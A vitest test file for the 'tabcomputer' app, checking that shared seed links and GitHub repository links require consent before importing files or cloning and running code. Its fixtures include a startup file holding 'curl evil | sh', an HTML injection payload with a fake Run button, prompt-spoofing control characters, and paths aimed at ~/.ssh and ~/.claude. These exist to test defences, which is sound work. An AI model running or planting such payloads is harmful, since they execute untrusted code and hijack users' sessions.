/**
 * Seed links (/s/<id>) and repository links (/<user>/<repo>), tabcomputer#116
 * (src/inbound-link.ts): a link from anyone never imports files or runs code
 * in a main profile, or in a guest someone keeps, without a yes in the run
 * links' window. Also that the server lets the app start at those addresses
 * (the base element), which is only safe together with the question.
 */
import { describe, it, expect, afterAll } from 'vitest';
import { readFileSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { spawn, type ChildProcess } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { handleInboundLink, linkNeedsConsent, seedPrompt, repoPrompt, type InboundLinkDeps } from '@shiro/inbound-link';
import { inboundCodeLink, parseGuestLabel, RESERVED_PATHS, type GuestInfo } from '@shiro/guest';
import { buildRunPrompt } from '@shiro/run-prompt';
import type { RunPromptInfo } from '@shiro/run-url';
import { pipeBytes } from '@shiro/utils/stream-bytes';

const ORIGIN = 'https://tabcomputer.com';
const ROOT = new URL('../../../', import.meta.url);
const guestOf = (label: string) => parseGuestLabel(label) as GuestInfo;

const NDJSON = [
  { path: '/', type: 'dir' },
  { path: '/home/user/notes.txt', type: 'file', content: btoa('hi') },
  { path: '/home/user/.profile', type: 'file', content: btoa('curl evil | sh') },
].map((n) => JSON.stringify(n)).join('\n');
const ENVELOPE = { version: 1, hostname: 'tabcomputer.com', timestamp: Date.UTC(2026, 9, 12), files: 2, ndjson: NDJSON, storage: JSON.stringify({ 'tabcomputer-become': '{"slug":"x"}' }) };

const gzip = (text: string) => pipeBytes(new TextEncoder().encode(text), new CompressionStream('gzip'));

/** handleInboundLink's surroundings, recording what it did, in order */
function harness(pathname: string, over: Partial<InboundLinkDeps> = {}, answer = false) {
  const log = { events: [] as string[], prompts: [] as RunPromptInfo[], loads: [] as { paths: string[]; storage: unknown }[], clones: [] as Parameters<InboundLinkDeps['cloneAndRun']>[0][], reports: [] as string[], fetched: [] as string[] };
  const deps: InboundLinkDeps = {
    pathname, origin: ORIGIN, home: '/home/user', guest: null, framed: false, guestUnavailable: false,
    fetch: async (url) => {
      log.events.push('fetch'); log.fetched.push(url);
      return url === `${ORIGIN}/api/seed/abcd1234` ? new Response(await gzip(JSON.stringify(ENVELOPE))) : new Response('{"error":"Seed not found"}', { status: 404 });
    },
    gunzip: (b) => pipeBytes(b, new DecompressionStream('gzip')),
    cleanUrl: () => { log.events.push('clean'); },
    confirm: async (info) => { log.events.push('confirm'); log.prompts.push(info); return answer; },
    seed: {
      parse: async (ndjson) => ndjson.split('\n').map((l) => JSON.parse(l)),
      load: async (nodes, storage) => { log.events.push('load'); log.loads.push({ paths: nodes.map((n) => n.path), storage }); },
    },
    cloneAndRun: (r) => { log.events.push('clone'); log.clones.push(r); },
    report: (m) => { log.reports.push(m); },
    ...over,
  };
  return { deps, log };
}

describe('inbound links: who is asked', () => {
  const seed = inboundCodeLink('/s/abcd1234')!;
  const repo = inboundCodeLink('/someone/repo')!;
  it('a main profile always', () => {
    expect(linkNeedsConsent(seed, null)).toBe(true);
    expect(linkNeedsConsent(repo, null)).toBe(true);
  });
  it('not the guest bootGuest made for the link: the seed\'s own, or a thrown-away one', () => {
    expect(linkNeedsConsent(seed, guestOf('guest--seedabcd1234'))).toBe(false);
    expect(linkNeedsConsent(seed, guestOf('guest--k3j2h1g0f9--t'))).toBe(false);
    expect(linkNeedsConsent(repo, guestOf('guest--k3j2h1g0f9--t'))).toBe(false);
  });
  it('a guest kept under another name: it may hold work and sign-ins', () => {
    expect(linkNeedsConsent(seed, guestOf('guest--work'))).toBe(true);
    expect(linkNeedsConsent(seed, guestOf('guest--seedzzzz9999'))).toBe(true);
    expect(linkNeedsConsent(repo, guestOf('guest--work'))).toBe(true);
    expect(linkNeedsConsent(repo, guestOf('guest--seedabcd1234'))).toBe(true);
  });
  it('/s/ is only ever a seed, never the repository of a user named s', () => {
    expect(RESERVED_PATHS).toContain('s');
    for (const p of ['/s/ABC', '/s/abc', '/s/aaaaaaaaaaaaaaaaaaaaaaaa', '/S/repo']) expect(inboundCodeLink(p), p).toBeNull();
  });
});

describe('inbound links: a shared seed', () => {
  it('in a main profile nothing is loaded until the person agrees; Cancel changes nothing', async () => {
    const h = harness('/s/abcd1234');
    expect(await handleInboundLink(h.deps)).toBe('cancelled');
    expect(h.log.events).toEqual(['clean', 'fetch', 'confirm']);   // the link leaves the address first
    expect(h.log.loads).toEqual([]);
    expect(h.log.reports).toEqual([]);
  });
  it('the window says what it replaces and lists what it holds, startup files first', async () => {
    const h = harness('/s/abcd1234');
    await handleInboundLink(h.deps);
    const p = h.log.prompts[0];
    expect(p.wording).toMatchObject({ window: 'Shared seed', title: 'Load the shared seed "abcd1234"?', action: 'Load' });
    expect(p.wording!.warn).toContain('replaces every file in this tabcomputer');
    expect(p.wording!.warn).toContain('can use any account this tabcomputer is signed in to');
    expect(p.wording!.warn).toContain('Your sign-ins are kept');
    expect(p.from).toBe('a shared link (made on tabcomputer.com, 2026-10-12)');
    expect(p.script.indexOf('Runs when it starts:\n  /home/user/.profile')).toBe(0);
    expect(p.script).toContain('Browser settings it sets (1):\n  tabcomputer-become');
    expect(p.script).toContain('Files and directories (3):\n  /\n  /home/user/.profile\n  /home/user/notes.txt');
  });
  it('Load imports exactly what was shown', async () => {
    const h = harness('/s/abcd1234', {}, true);
    expect(await handleInboundLink(h.deps)).toBe('loaded');
    expect(h.log.events).toEqual(['clean', 'fetch', 'confirm', 'load']);
    expect(h.log.loads).toEqual([{ paths: ['/', '/home/user/notes.txt', '/home/user/.profile'], storage: ENVELOPE.storage }]);
    expect(h.log.fetched).toEqual([`${ORIGIN}/api/seed/abcd1234`]);
  });
  it('in the guest made for it there is nothing of the person\'s: it loads without a question', async () => {
    const h = harness('/s/abcd1234', { guest: guestOf('guest--seedabcd1234') });
    expect(await handleInboundLink(h.deps)).toBe('loaded');
    expect(h.log.prompts).toEqual([]);
  });
  it('in a guest kept under another name it asks, and names the guest', async () => {
    const h = harness('/s/abcd1234', { guest: guestOf('guest--work') });
    expect(await handleInboundLink(h.deps)).toBe('cancelled');
    expect(h.log.prompts[0].wording!.warn).toContain('replaces every file in this guest');
    expect(h.log.loads).toEqual([]);
  });
  it('text from the seed cannot dress the window up', () => {
    const p = seedPrompt('abcd1234', { ndjson: '', hostname: 'a‮b\nRun this\x1b[2J', timestamp: NaN, storage: '{not json' }, ['/x​\ny'], null);
    expect(p.from).toBe('a shared link (made on a?b Run this?[2J)');
    expect(p.script).toBe('Files and directories (1):\n  /x? y\n');
  });
  it('a missing seed, or one that is not a seed, is refused with a reason and never asked about', async () => {
    const none = harness('/s/zzzz9999', {}, true);
    expect(await handleInboundLink(none.deps)).toBe('refused');
    expect(none.log.reports).toEqual(['no such shared seed (or this server keeps none)']);
    const junk = harness('/s/abcd1234', { fetch: async () => new Response(await gzip('{"files":3}')) }, true);
    expect(await handleInboundLink(junk.deps)).toBe('refused');
    expect(junk.log.reports).toEqual(['the shared seed could not be read']);
    for (const h of [none, junk]) { expect(h.log.prompts).toEqual([]); expect(h.log.loads).toEqual([]); }
  });
});

describe('inbound links: a repository', () => {
  it('in a main profile nothing is cloned until the person agrees', async () => {
    const h = harness('/someone/repo');
    expect(await handleInboundLink(h.deps)).toBe('cancelled');
    expect(h.log.events).toEqual(['clean', 'confirm']);
    expect(h.log.clones).toEqual([]);
    const p = h.log.prompts[0];
    expect(p.wording).toMatchObject({ window: 'Repository link', title: 'Clone and run someone/repo?', action: 'Clone and run' });
    expect(p.from).toBe('github.com/someone/repo');
    expect(p.script.split('\n')[0]).toBe('git clone https://github.com/someone/repo ~/repo');
    expect(p.wording!.warn).toContain('use any account this tab is signed in to');
  });
  it('Clone and run starts it, from github.com only, into ~/<repo>', async () => {
    const h = harness('/someone/repo/', {}, true);
    expect(await handleInboundLink(h.deps)).toBe('started');
    expect(h.log.clones).toEqual([{ user: 'someone', repo: 'repo', url: 'https://github.com/someone/repo', dir: '/home/user/repo' }]);
  });
  it('a thrown-away guest runs it without a question; a kept one asks', async () => {
    const t = harness('/someone/repo', { guest: guestOf('guest--k3j2h1g0f9--t') });
    expect(await handleInboundLink(t.deps)).toBe('started');
    expect(t.log.prompts).toEqual([]);
    const k = harness('/someone/repo', { guest: guestOf('guest--work') });
    expect(await handleInboundLink(k.deps)).toBe('cancelled');
    expect(k.log.clones).toEqual([]);
    expect(repoPrompt('someone', 'repo', '/home/user/repo', guestOf('guest--work')).wording!.warn).toContain('in this guest');
  });
  it('refuses names that are not a GitHub repository, or would be cloned over a dot directory of home', async () => {
    for (const p of ['/someone/.claude', '/someone/.ssh', '/someone/..', '/-x/repo', '/a_b/repo', '/some.one/repo']) {
      const h = harness(p, {}, true);
      expect(await handleInboundLink(h.deps), p).toBe('refused');
      expect(h.log.events, p).toEqual(['clean']);
      expect(h.log.reports).toEqual(['that address is not a GitHub repository this page clones']);
    }
  });
});

describe('inbound links: where they do nothing', () => {
  it('inside a frame: the page around it could cover the window', async () => {
    for (const p of ['/s/abcd1234', '/someone/repo']) {
      const h = harness(p, { framed: true }, true);
      expect(await handleInboundLink(h.deps)).toBe('refused');
      expect(h.log.events).toEqual(['clean']);
      expect(h.log.reports[0]).toContain('ignored inside a frame');
    }
  });
  it('when the address asked for a guest and the server has none', async () => {
    for (const p of ['/s/abcd1234', '/someone/repo']) {
      const h = harness(p, { guestUnavailable: true }, true);
      expect(await handleInboundLink(h.deps)).toBe('refused');
      expect(h.log.events).toEqual(['clean']);
    }
  });
  it('an address that is neither is left alone', async () => {
    for (const p of ['/', '/about', '/api/seed', '/assets/x.js', '/a/b/c']) {
      const h = harness(p, {}, true);
      expect(await handleInboundLink(h.deps), p).toBe('none');
      expect(h.log.events).toEqual([]);
    }
  });
  it('a failure of the surroundings is reported, never thrown, and nothing is loaded', async () => {
    const h = harness('/s/abcd1234', { confirm: async () => { throw new Error('no window'); } });
    expect(await handleInboundLink(h.deps)).toBe('refused');
    expect(h.log.reports).toEqual(['it failed to start']);
    expect(h.log.loads).toEqual([]);
  });
});

describe('inbound links: the window is the run links\'', () => {
  it('shows the link\'s own words, as text, with the agreeing button off at first and Cancel working', () => {
    const info = repoPrompt('someone', 'repo', '/home/user/repo', null);
    info.script += '</pre><img src=x onerror=alert(1)><button data-act="run">Run</button>';
    const answers: boolean[] = [];
    const root = buildRunPrompt(info, (run) => answers.push(run));
    expect(root.querySelector('h3')!.textContent).toBe('Clone and run someone/repo?');
    expect(root.querySelector('pre')!.textContent).toBe(info.script);
    expect(root.querySelectorAll('img')).toHaveLength(0);
    const buttons = [...root.querySelectorAll('button')];
    expect(buttons.map((b) => [b.dataset.act, b.textContent])).toEqual([['cancel', 'Cancel'], ['run', 'Clone and run']]);
    expect(buttons[1].disabled).toBe(true);
    buttons[1].click();   // off: a click already on its way starts nothing
    expect(answers).toEqual([]);
    buttons[0].click();
    expect(answers).toEqual([false]);
  });
  it('a script link keeps its wording', () => {
    const root = buildRunPrompt({ name: 'sh-1', from: 'this link', script: 'echo hi\n', env: {}, ignored: [], dir: '/home/user/run/sh-1' }, () => {});
    expect(root.querySelector('h3')!.textContent).toBe('Run this script?');
    expect(root.querySelector('[data-act=run]')!.textContent).toBe('Run');
    // the question, where it is from, the script, and one sentence on what it can touch
    expect([...root.querySelectorAll('p')].map((p) => p.textContent)).toEqual([
      'From this link. Not reviewed by tabcomputer.',
      'The script has 1 line. Scroll to the end to turn Run on.',
      'It runs as you: it can read and change every file in this tab and use its sign-ins (Claude, GitHub).',
    ]);
    const again = buildRunPrompt({ name: 'sh-1', from: 'this link', script: 'echo hi\n', env: {}, ignored: [], dir: '/home/user/run/sh-1', onOpenOnly: 'cd work' }, () => {});
    expect(again.textContent).toContain('It already ran here. Run only does its on-open line: cd work');
  });
});

describe('inbound links: main.ts', () => {
  const main = readFileSync(new URL('src/main.ts', ROOT), 'utf8');
  it('has one way in for both kinds, and no other import or clone made from the address', () => {
    expect(main.match(/handleInboundLink\(/g)).toHaveLength(1);
    expect(main).not.toMatch(/window\.confirm\(/);
    expect(main).not.toMatch(/location\.pathname\.match\(/);
    expect(main.match(/git clone/g)).toHaveLength(1);
    const block = main.slice(main.indexOf('const inbound = '), main.indexOf('Initialize drag-and-drop seed GIF import'));
    expect(block).toContain('const inbound = safe ? null : inboundCodeLink(location.pathname);');   // not in safe mode
    expect(block).toContain('confirm: (info) => showRunPrompt(info, desktop?.wm ?? null)');
    expect(block).toContain('guestUnavailable: guestUnavailable()');
    for (const call of ['importSeedState(', 'git clone', 'detectAndRun(']) expect(block.indexOf(call), call).toBeGreaterThan(block.indexOf('handleInboundLink({'));
    expect(main.indexOf('importSeedState(fs, nodes')).toBeGreaterThan(main.indexOf('const inbound = '));
  });
});

describe('server.mjs: the app starts at the addresses it acts on', () => {
  const serverPath = decodeURIComponent(new URL('server.mjs', ROOT).pathname);
  const procs: ChildProcess[] = [];
  const dirs: string[] = [];
  afterAll(() => { for (const p of procs) p.kill(); for (const d of dirs) rmSync(d, { recursive: true, force: true }); });
  async function start(env: Record<string, string>): Promise<string> {
    const dir = mkdtempSync(join(tmpdir(), 'inbound-links-'));
    dirs.push(dir);
    writeFileSync(join(dir, 'index.html'), '<!doctype html><html><head><title>t</title></head><body><script type="module">import "./assets/index-abc.js"</script></body></html>');
    const proc = spawn(process.execPath, [serverPath], { env: { ...process.env, PORT: '0', STATIC_DIR: dir, SEED_DIR: join(dir, 'seeds'), TABCOMPUTER_SEED_SHARE: '', TABCOMPUTER_GUESTS: '', ...env }, stdio: ['ignore', 'pipe', 'pipe'] });
    procs.push(proc);
    const port = await new Promise<number>((resolve, reject) => {
      proc.once('exit', (c) => reject(new Error(`server exited (${c})`)));
      proc.stdout!.on('data', (d) => { const m = /listening on :(\d+)/.exec(String(d)); if (m) resolve(Number(m[1])); });
    });
    return `http://127.0.0.1:${port}`;
  }
  const based = async (url: string) => (await (await fetch(url)).text()).includes('<head>\n  <base href="/">');

  it('keeps the same list of paths that are never a repository as the page', () => {
    const src = readFileSync(serverPath, 'utf8');
    const list = /export const REPO_LINK_RESERVED = (\[[^\]]*\]);/.exec(src)![1];
    expect(JSON.parse(list.replace(/'/g, '"'))).toEqual(RESERVED_PATHS);
  });
  it('gives the shell a base element exactly where the page reads a link from the path', async () => {
    const [off, on] = await Promise.all([start({}), start({ TABCOMPUTER_SEED_SHARE: '1' })]);
    const paths = ['/', '/about', '/someone/repo', '/someone/repo/', '/Some-One/re-po_1', '/s/abcd1234', '/s/ABC', '/api/x', '/oauth/x', '/apps/x', '/a/b/c', '/guest/x'];
    for (const p of paths) {
      const link = inboundCodeLink(p);
      expect(await based(on + p), `sharing on: ${p}`).toBe(!!link);
      // (where the server keeps no seeds, a seed link's page stays as it was: it has nothing to load)
      expect(await based(off + p), `sharing off: ${p}`).toBe(link?.kind === 'repo');
    }
  }, 30_000);
  it('a repository whose name has a dot gets the app, a missing file of the site a 404', async () => {
    const base = await start({});
    mkdirSync(join(dirs.at(-1)!, 'fonts'));
    for (const p of ['/socketio/socket.io', '/vercel/next.js']) {
      expect(inboundCodeLink(p)?.kind, p).toBe('repo');
      expect(await based(base + p), p).toBe(true);
    }
    for (const p of ['/fonts/missing.woff2', '/assets/x.js', '/nope.js']) expect((await fetch(base + p)).status, p).toBe(404);
  }, 30_000);
});
